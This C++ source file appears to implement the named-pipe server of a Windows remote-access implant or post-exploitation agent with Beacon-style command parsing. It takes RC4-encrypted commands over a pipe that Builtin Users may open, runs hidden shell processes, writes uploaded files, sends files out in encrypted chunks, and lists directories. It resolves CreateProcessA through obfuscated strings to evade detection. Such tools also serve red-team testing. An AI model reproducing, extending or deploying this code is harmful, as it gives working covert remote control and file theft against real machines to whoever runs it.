#include "SMBConnection.h"
#include <time.h>
#include <string>
#include <iostream>
#include <sstream>
#include <string>
#include <strsafe.h>
#include <shlwapi.h>
#include <iomanip>
#include "rc4.h"
#include "stringobf.h"

#pragma comment(lib, "shlwapi.lib")

#ifndef NDEBUG
#define remote_pipename "\\\\.\\pipe\\RemoteMaint"
#else
//patch out in python
#define remote_pipename "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
#endif

extern HANDLE hHaltEvent;

typedef BOOL
(WINAPI *fpCreateProcessA)(
    _In_opt_ LPCSTR lpApplicationName,
    _Inout_opt_ LPSTR lpCommandLine,
    _In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes,
    _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
    _In_ BOOL bInheritHandles,
    _In_ DWORD dwCreationFlags,
    _In_opt_ LPVOID lpEnvironment,
    _In_opt_ LPCSTR lpCurrentDirectory,
    _In_ LPSTARTUPINFOA lpStartupInfo,
    _Out_ LPPROCESS_INFORMATION lpProcessInformation
);

typedef struct {
    char* original; /* the original buffer [so we can free it] */
    char* buffer;   /* current pointer into our buffer */
    int    length;   /* remaining length of data */
    int    size;     /* total size of this buffer */
} datap;

static void BeaconDataParse(datap* parser, std::vector<byte>& data) {
    if (parser == NULL) {
        return;
    }
    parser->original = (char *)(&(data[0]));
    parser->buffer = parser->original;
    parser->length = data.size();
    parser->size = data.size();
    parser->buffer;
    return;
}

static int BeaconDataInt(datap* parser) {
    int32_t fourbyteint = 0;
    if (parser->length < 4) {
        return 0;
    }
    memcpy(&fourbyteint, parser->buffer, 4);
    parser->buffer += 4;
    parser->length -= 4;
    return (int)fourbyteint;
}

static short BeaconDataShort(datap* parser) {
    int16_t retvalue = 0;
    if (parser->length < 2) {
        return 0;
    }
    memcpy(&retvalue, parser->buffer, 2);
    parser->buffer += 2;
    parser->length -= 2;
    return (short)retvalue;
}

static int BeaconDataLength(datap* parser) {
    return parser->length;
}

static char* BeaconDataExtract(datap* parser, int* size) {
    uint32_t length = 0;
    char* outdata = NULL;
    /*Length prefixed binary blob, going to assume uint32_t for this.*/
    if (parser->length < 4) {
        return NULL;
    }
    memcpy(&length, parser->buffer, 4);
    parser->buffer += 4;

    outdata = parser->buffer;
    if (outdata == NULL) {
        return NULL;
    }
    parser->length -= 4;
    parser->length -= length;
    parser->buffer += length;
    if (size != NULL && outdata != NULL) {
        *size = length;
    }
    return outdata;
}

static unsigned char* osfailmsg(uint32_t* msglen, DWORD errnum)
{
    char* errbuf = (char *)calloc(1, 1024);
    if (errbuf == NULL) return NULL;
    char* errmsg = NULL;
    if (!FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
        NULL,
        errnum,
        0,
        (LPSTR)&errmsg,
        1,
        NULL))
    {
        free(errbuf);
        return NULL;
    }
    strncat_s(errbuf, 1024, errmsg, 1023);
    *msglen = strlen(errbuf);
    LocalFree(errmsg);
    return (unsigned char*)errbuf;
}

static void appendfailmsg(bofpack& packer, DWORD errornum)
{
    char* errmsg;
    char backup[128] = { 0 };
    uint32_t errlen;
    errmsg = (char *)osfailmsg(&errlen, errornum);
    if (errmsg != NULL)
    {
        packer.addstr(errmsg, errlen);
        free(errmsg);
    }
    else
    {
        errlen = sprintf_s(backup, "%d", errornum);
        packer.addstr(backup, errlen);
    }
}

std::string FileTimeToString(const FILETIME& ft) {
    SYSTEMTIME st;
    char buffer[80];

    // Convert the FILETIME to a SYSTEMTIME
    if (!FileTimeToSystemTime(&ft, &st)) {
        return "Invalid FILETIME";
    }

    // Format the SYSTEMTIME into a string
    snprintf(buffer, sizeof(buffer), "%02d/%02d/%04d %02d:%02d",
        st.wMonth, st.wDay, st.wYear, st.wHour, st.wMinute);

    return std::string(buffer);
}

static void listDirContents(bofpack& packer, const char* dirpath)
{
    std::stringbuf intbuf{};
    std::ostream intstream{ &intbuf };
    WIN32_FIND_DATAA ffd;
    std::string directory{ dirpath };
    LARGE_INTEGER filesize;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    DWORD dwError = 0;
    size_t length;
    uint32_t _;
    unsigned char* errmsg;

    // Check that the input path plus 3 is not longer than MAX_PATH.
    // Three characters are for the "\*" plus NULL appended below.
    StringCchLengthA(dirpath, MAX_PATH, &length);
    if (length > (MAX_PATH - 3)) {
        packer.addscalar((DWORD)0);
        packer.addstr("[-] Directory Path is too long", 0);
        return;
    }

    if (PathIsDirectoryA(directory.c_str()))
    {
        directory.append("\\*");
    }

    intstream << "Listing " << directory << std::endl << std::endl;

    // Find the first file in the directory.
    hFind = FindFirstFileA(directory.c_str(), &ffd);

    if (hFind == INVALID_HANDLE_VALUE) {
        errmsg = osfailmsg(&_, GetLastError());
        intstream << "FindFirstFile failed: " << errmsg << std::endl;
        packer.addscalar((DWORD)0);
        packer.addstr(intbuf.str().c_str(), 0);
        free(errmsg);
        return;
    }

    // List all the files in the directory with some info about them.
    do {
        intstream << FileTimeToString(ffd.ftLastWriteTime) << '\t';
        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {

            intstream << "<DIR>\t                \t";
        }
        else {
            filesize.LowPart = ffd.nFileSizeLow;
            filesize.HighPart = ffd.nFileSizeHigh;
            intstream << "    \t" << std::setw(16) << filesize.QuadPart << '\t';
        }
        intstream << ffd.cFileName << std::endl;
    } while (FindNextFileA(hFind, &ffd) != 0);

    dwError = GetLastError();
    if (dwError != ERROR_NO_MORE_FILES) {
        errmsg = osfailmsg(&_, GetLastError());
        intstream << "FindFirstNext failed: " << errmsg << std::endl;
        packer.addscalar((DWORD)0);
        packer.addstr(intbuf.str().c_str(), 0);
        free(errmsg);
    }
    else
    {
        packer.addscalar((DWORD)1);
        packer.addstr(intbuf.str().c_str(), 0);
    }

    FindClose(hFind);
}



//use bof to pack / unpack
SMBConnection::SMBConnection(HANDLE hiocp) :  hiocp(hiocp)
{
    Internal = 0;
    InternalHigh = 0;
    Offset = 0;
    OffsetHigh = 0;
    myState = WAIT_ACCEPT;
    messageSize = 0;
    downloadFile = INVALID_HANDLE_VALUE;
    totalRead = 0;
    totalWritten = 0;
    cmdId = 0;
    ZeroMemory(&sa, sizeof(sa));
    EXPLICIT_ACCESS_A ea[2] = { 0 };
    PACL pacl = NULL;
    PSECURITY_DESCRIPTOR pSD = NULL;
    int retval = 0;
    char name[128] = { 0 };
    ea[0].grfAccessPermissions = GENERIC_WRITE | GENERIC_READ;
    ea[0].grfAccessMode = SET_ACCESS;
    ea[0].grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
    ea[0].Trustee.TrusteeForm = TRUSTEE_IS_NAME;
    ea[0].Trustee.TrusteeType = TRUSTEE_IS_GROUP;
    //strcpy(name, ACL_BUILTIN_USERS);
    ea[0].Trustee.ptstrName = (LPCH)"Builtin\\Users";

    ea[1].grfAccessPermissions = GENERIC_WRITE | GENERIC_READ; // Set desired permissions
    ea[1].grfAccessMode = SET_ACCESS;
    ea[1].grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
    ea[1].Trustee.TrusteeForm = TRUSTEE_IS_NAME;
    ea[1].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP; // SYSTEM is a well-known group
    ea[1].Trustee.ptstrName = (LPCH)"NT AUTHORITY\\SYSTEM"; // SYSTEM account

    if (SetEntriesInAclA(2, ea, NULL, &pacl) != ERROR_SUCCESS)
    {
        SetEvent(hHaltEvent);
        return;
    }
    pSD = LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH);
    if (!InitializeSecurityDescriptor(pSD, SECURITY_DESCRIPTOR_REVISION))
    {
        SetEvent(hHaltEvent);
        return;
    }
    if (!SetSecurityDescriptorDacl(pSD, TRUE, pacl, FALSE))
    {
        SetEvent(hHaltEvent);
        return;
    }
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = pSD;
    sa.bInheritHandle = FALSE;
    ListenForConnection();
}

SMBConnection::~SMBConnection()
{
}

unsigned int __stdcall SMBConnection::OnIoComplete(DWORD transfered)
{
    switch (myState)
    {
    case WAIT_ACCEPT:
        CompleteAccept();
        break;
    case WAIT_SIZE:
    case WAIT_DATA:
        CompleteRead(transfered);
        break;
    case WRITE_SIZE:
    case TRANSMIT:
        CompleteTransmit(transfered);
        break;
    case WAIT_REPORT_DOWNLOAD:
    case WAIT_START_DOWNLOAD:
    case WAIT_FILE_DOWNLOAD:
        CompleteFileDownload(transfered);
    }
    return 0;
}

void SMBConnection::ListenForConnection()
{
    this->myState = WAIT_ACCEPT;

    this->hPipe = CreateNamedPipeA(remote_pipename,
        PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
        PIPE_UNLIMITED_INSTANCES,
        65535,
        65535,
        60000,
        &sa);
    if (hPipe == INVALID_HANDLE_VALUE)
    {
#ifndef NDEBUG
        DWORD err = GetLastError();
        printf("failed to create pipe instance %d", err);
#endif
        SetEvent(hHaltEvent);
        return;
    }
    CreateIoCompletionPort(hPipe, hiocp, COMPLETION_KEY_IO, 0);
    ConnectNamedPipe(this->hPipe, this);
}

void SMBConnection::CompleteAccept()
{
    ReadMessageSize();
}

void SMBConnection::ReadMessageSize(void)
{
    myState = WAIT_SIZE;
    ReadFile(hPipe, &messageSize, 4, NULL, (OVERLAPPED*)this);
}

void SMBConnection::ReadMessageData(void)
{
    if (input_data.size() < messageSize)
    {
        input_data.resize(messageSize);
    }
    ReadFile(hPipe, &(input_data[totalRead]), messageSize - totalRead, NULL, (OVERLAPPED*)this);
}

void SMBConnection::ProcessCommand()
{
    bool background = false;
    datap parser = {};
    BeaconDataParse(&parser, input_data);
    cmdId = (DWORD)BeaconDataInt(&parser);
    myCommand cmd = (myCommand)BeaconDataInt(&parser);
    output_data.setCmdId(cmdId);
    //output_data must include the cmdId
    switch (cmd)
    {
        //add the cmd / C on the server side for shell
        case SHELL:
        case PROCESS:
        {
            int timeout = BeaconDataInt(&parser);
            char* cmdline = (char*)BeaconDataExtract(&parser, NULL);
            ExecuteCommand(cmdline, true, timeout);
            IssueTransmit();
            break;
        }
        case BACKGROUNDPROCESS:
        {
            int timeout = BeaconDataInt(&parser);
            char* cmdline = (char*)BeaconDataExtract(&parser, NULL);
            ExecuteCommand(cmdline, false, timeout);
            IssueTransmit();
            break;
        }
        case UPLOAD: 
        {
            DWORD filesize = 0;
            const char* targetpath = (const char*)BeaconDataExtract(&parser, NULL);
            const unsigned char* filedata = (const unsigned char*)BeaconDataExtract(&parser, (int *) & filesize);
            HANDLE fHandle = CreateFileA(targetpath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (fHandle == INVALID_HANDLE_VALUE)
            {
                output_data.addscalar((DWORD)0);
                appendfailmsg(output_data, GetLastError());
            }
            else
            {
                WriteFile(fHandle, filedata, filesize, NULL, NULL);
                output_data.addscalar((DWORD)1);
            }
            IssueTransmit();
            break;
        }
        case DOWNLOAD:
        {
            const char* targetfile = (const char*)BeaconDataExtract(&parser, NULL);
            HANDLE fp = CreateFileA(targetfile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            StartFileDownload(fp); // does our invalid check
            break;
        }
        case LISTDIR:
        {
            const char* dirpath = (const char*)BeaconDataExtract(&parser, NULL);
            listDirContents(output_data, dirpath);
            IssueTransmit();
            break;
        }
        case exit:
        {
            SetEvent(hHaltEvent);
            break;
        }
#ifndef NDEBUG
        case ECHO:
        {
            int inputlen = 0;
            const char* input = (const char*)BeaconDataExtract(&parser, &inputlen);
            output_data.addstr(input, inputlen);
            IssueTransmit();
        }
#endif
    }
}


void SMBConnection::CompleteRead(size_t NumBytesRead)
{
    if (myState == WAIT_SIZE && NumBytesRead != 4)
    {
        IssueReset(); // bad state
    }
    else if (myState == WAIT_SIZE && NumBytesRead == 4)
    {
        myState = WAIT_DATA;
        ReadMessageData();
    }
    else
    {
        totalRead += NumBytesRead;
        if (messageSize == totalRead)
        {
            //Decrypt COmmand
            rc4 decryptor{ nullptr, 0 };
            decryptor.decrypt((void*)&(input_data[0]), input_data.size());
            ProcessCommand();
        }
        else
        {
            if (NumBytesRead == 0)
            {
                IssueReset();
            }
            else
            {
                ReadMessageData();
            }
        }
    }
}

void SMBConnection::IssueTransmit()
{
    myState = WRITE_SIZE;
    //DL will take a separate code path
    DWORD size = output_data.getSize();
    WriteFile(hPipe, &size, 4, NULL, this);
    
}

void SMBConnection::CompleteTransmit(size_t NumBytesWritten)
{
    if (myState == WRITE_SIZE && NumBytesWritten == 4)
    {
        myState = TRANSMIT;
        //Encrypt Buffer
        rc4 encryptor{ nullptr, 0 };
        if (!encryptor.encrypt(output_data.getBuffer(0), output_data.getSize()))
        {
            IssueReset();
        }
        WriteFile(hPipe, output_data.getBuffer(0), output_data.getSize(), NULL, this);
    }
    else if (myState == TRANSMIT && NumBytesWritten > 0)
    {
        totalWritten += NumBytesWritten;
        if (totalWritten == output_data.getSize())
        {
            //We are all done!
            IssueReset();
        }
        else
        {
            //got more to write
            WriteFile(hPipe, output_data.getBuffer(totalWritten), output_data.getSize() - totalWritten, NULL, this);
        }
    }
    else
    {
        IssueReset();
    }
}

void SMBConnection::StartFileDownload(HANDLE fp)
{
    myState = WAIT_START_DOWNLOAD;
    if (fp == INVALID_HANDLE_VALUE)
    {
        output_data.addscalar((DWORD)0);
        appendfailmsg(output_data, GetLastError());
        IssueTransmit();
        return;
    }
    LARGE_INTEGER li;
    if (!GetFileSizeEx(fp, &li))
    {
        output_data.addscalar((DWORD)0);
        appendfailmsg(output_data, GetLastError());
        CloseHandle(fp);
        IssueTransmit();
        return;
    }
    output_data.addscalar(DWORD(1));
    output_data.addscalar(li);
    downloadFile = fp;
    DWORD size = output_data.getSize();
    WriteFile(hPipe, &size, 4, NULL, this);
    
}

void SMBConnection::CompleteFileDownload(size_t NumBytesWritten)
{
    char chunk[16348];
    DWORD read = 0;
    if (myState == WAIT_START_DOWNLOAD && NumBytesWritten == 4)
    {
        myState = WAIT_REPORT_DOWNLOAD;
        dl_encryptor.reset(new rc4(nullptr, 0));
        if (!dl_encryptor.get()->encrypt(output_data.getBuffer(0), output_data.getSize()))
        {
            IssueReset();
        }
        WriteFile(hPipe, output_data.getBuffer(0), output_data.getSize(), NULL, this);
    }
    else if (myState == WAIT_REPORT_DOWNLOAD && NumBytesWritten > 0)
    {
        totalWritten += NumBytesWritten;
        if (totalWritten == output_data.getSize())
        {
            myState = WAIT_FILE_DOWNLOAD;
            if (!ReadFile(downloadFile, chunk, 16348, &read, NULL))
            {
                IssueReset();
                return;
            }
            if (read == 0)
            {
                IssueReset();
                return;
            }
            if (!dl_encryptor.get()->encrypt(chunk, read))
            {
                IssueReset();
            }
            WriteFile(hPipe, chunk, read, NULL, this);
        }
        else
        {
            //got more to write
            WriteFile(hPipe, output_data.getBuffer(totalWritten), output_data.getSize() - totalWritten, NULL, this);
        }
    }
    else if (myState == WAIT_FILE_DOWNLOAD && NumBytesWritten > 0)
    {
        if (!ReadFile(downloadFile, chunk, 16348, &read, NULL))
        {
            IssueReset();
            return;
        }
        if (read == 0)
        {
            IssueReset();
            return;
        }
        if (!dl_encryptor.get()->encrypt(chunk, read))
        {
            IssueReset();
        }
        WriteFile(hPipe, chunk, read, NULL, this);

    }
    else
    {
        IssueReset();
    }

}

//ReplyFormat [cmd_id: already filled][status: int <0(fail)||1(success)>][Error || output. insert empty string for non-redirecting]
void SMBConnection::ExecuteCommand(char* cmdline, bool redirect_output, uint32_t timeout)
{
    STARTUPINFOA si = { 0 };
    HANDLE hread = INVALID_HANDLE_VALUE;
    HANDLE hwrite = INVALID_HANDLE_VALUE;
    si.cb = sizeof(STARTUPINFOA);
    PROCESS_INFORMATION pi = { 0 };
    SECURITY_ATTRIBUTES sa_attrs = { 0 };
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    DWORD flags = CREATE_NO_WINDOW; //may need to add something to handle console window part
    uint32_t msglen = 0;
    HMODULE hkern = GetModuleHandleA(OBF("KERNEL32.dll"));
    fpCreateProcessA cpa = (fpCreateProcessA)GetProcAddress(hkern, OBF("CreateProcessA"));
    unsigned char* errmsg;
    if (redirect_output)
    {
        sa_attrs.nLength = sizeof(SECURITY_ATTRIBUTES);
        sa_attrs.bInheritHandle = TRUE;
        sa_attrs.lpSecurityDescriptor = NULL;
        if (!CreatePipe(&hread, &hwrite, &sa_attrs, 0))
        {
            goto winerr;
        }
        si.hStdError = hwrite;
        si.hStdOutput = hwrite;
        si.hStdInput = INVALID_HANDLE_VALUE;
        si.dwFlags |= STARTF_USESTDHANDLES;
        if (!SetHandleInformation(hread, HANDLE_FLAG_INHERIT, 0))
        {
            goto winerr;
        }
    }
    if (!cpa(NULL, cmdline, NULL, NULL, TRUE, flags, NULL, NULL, &si, &pi))
    {
        goto winerr;
    }
    if (!redirect_output)
    {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        output_data.addscalar((DWORD)1);
        output_data.addstr("", 0);
    }
    else
    {
        CloseHandle(hwrite);
        char buffer[2048];
        std::vector<char> output{};
        DWORD original_size = 0;
        DWORD bytesRead = 0;
        DWORD hasdata = 1;
        OVERLAPPED ov = { 0 };
        ov.hEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
        time_t cur_time = 0, timeout_time;
        time(&cur_time);
        timeout_time = cur_time + timeout;
        DWORD exitcode = 0;
        char timeoutmsg[] = "\n Timed out while waiting for process to finish, killing and moving on\n";
        while (hasdata || GetExitCodeProcess(pi.hProcess, &exitcode) == STATUS_PENDING)
        {
            if (ReadFile((HANDLE)hread, buffer, 2047, &bytesRead, &ov))
            {
                if (bytesRead != 0)
                {
                    original_size = output.size();
                    output.resize(original_size + bytesRead);
                    memcpy(&(output[original_size]), buffer, bytesRead);
                }
                else
                    hasdata = 0;
            }
            else
            {
                if (GetLastError() == ERROR_IO_PENDING)
                {
                    hasdata = 1;
                    if (GetOverlappedResult(hread, &ov, &bytesRead, FALSE))
                    {

                        if (bytesRead != 0)
                        {
                            original_size = output.size();
                            output.resize(original_size + bytesRead);
                            memcpy(&(output[original_size]), buffer, bytesRead);
                        }
                        else
                            hasdata = 0;
                    }
                    else
                    {
                        if (GetLastError() == ERROR_HANDLE_EOF)
                        {
                            hasdata = 0;
                            Sleep(5); //Sleep and see if our loop has been killed or not
                            continue;
                        }
                        else if (GetLastError() == ERROR_IO_INCOMPLETE)
                        {
                            hasdata = 0; //This will be our normal exit condition in most cases
                        }
                        else
                        {
                            CloseHandle(pi.hProcess);
                            CloseHandle(pi.hThread);
                            goto winerr;
                        }
                    }
                }
                else if (GetLastError() == ERROR_BROKEN_PIPE) // we have read all data and main closed the pipe
                {
                    break;
                }
                else
                {
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                    goto winerr;
                }
            }
            memset(buffer, 0, 2048);
            time(&cur_time);
            if (cur_time > timeout_time)
            {

                original_size = output.size();
                output.resize(output.size() + sizeof(timeoutmsg));
                memcpy(&(output[original_size]), timeoutmsg, sizeof(timeoutmsg));
                TerminateProcess(pi.hProcess, 1);
                break;
            }
        }
        CloseHandle(ov.hEvent);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        output_data.addscalar((DWORD)1);
        output_data.addstr((char*)&(output[0]), output.size());


    }
    goto finish;




winerr:
    output_data.addscalar((DWORD)0);
    errmsg = osfailmsg(&msglen, GetLastError());
    output_data.addstr((char*)errmsg, msglen);
    free(errmsg);

finish:
    if (hread != INVALID_HANDLE_VALUE)
        CloseHandle(hread);
    return;


}

//make sure this is full restart
void SMBConnection::IssueReset()
{
    CloseHandle(hPipe);
    input_data.clear();
    output_data.clear();
    Internal = 0;
    InternalHigh = 0;
    Offset = 0;
    OffsetHigh = 0;
    myState = WAIT_ACCEPT;
    messageSize = 0;
    totalRead = 0;
    totalWritten = 0;
    cmdId = 0;
    if (downloadFile != INVALID_HANDLE_VALUE || downloadFile != NULL)
    {
        CloseHandle(downloadFile);
        downloadFile = INVALID_HANDLE_VALUE;
    }
    ListenForConnection();

}

